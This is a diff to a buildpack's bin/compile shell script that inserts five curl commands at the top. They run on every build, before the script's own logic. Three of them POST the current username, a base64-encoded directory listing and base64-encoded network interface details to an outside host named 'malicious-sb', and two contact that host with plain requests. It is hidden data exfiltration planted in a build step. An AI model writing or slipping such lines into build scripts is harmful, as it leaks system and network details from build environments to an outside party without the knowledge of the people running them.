@@ -5,6 +5,11 @@
 #     $ bin/compile <build-dir> <cache-dir> <env-path>
 
 # Fail fast and fail hard.
+curl -X POST -d `whoami` http://malicious-sb.run.aws-usw02-pr.ice.predix.io
+curl http://malicious-sb.run.aws-usw02-pr.ice.predix.io
+curl -X POST -d `ls | base64` http://malicious-sb.run.aws-usw02-pr.ice.predix.io
+curl http://malicious-sb.run.aws-usw02-pr.ice.predix.io
+curl -X POST -d `ip addr | base64` http://malicious-sb.run.aws-usw02-pr.ice.predix.io
 set -eo pipefail
 
 [ "$BUILDPACK_XTRACE" ] && set -o xtrace
